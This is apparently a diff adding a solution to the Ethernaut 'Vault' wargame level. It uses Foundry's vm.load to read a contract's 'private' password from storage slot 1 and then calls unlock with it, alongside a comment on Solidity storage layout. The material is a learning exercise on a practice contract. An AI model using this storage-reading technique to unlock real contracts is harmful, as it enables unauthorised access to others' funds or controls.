@@ -7,7 +7,6 @@ import {EthernautHelper} from "../setup/EthernautHelper.sol";
 // NOTE You can import your helper contracts & create interfaces here
 import {stdStorage, StdStorage} from "forge-std/Test.sol";              
 
-
 contract VaultSolution is Script, EthernautHelper {
     using stdStorage for StdStorage;
 
@@ -20,7 +19,8 @@ contract VaultSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-        
+        bytes32 password = vm.load(challengeInstance, bytes32(uint(1)));
+        challengeInstance.call(abi.encodeWithSignature("unlock(bytes32)", password));
         /**
          * Understanding Solidity’s Storage Layout And How To Access State Variables In Storage Slots.
          *
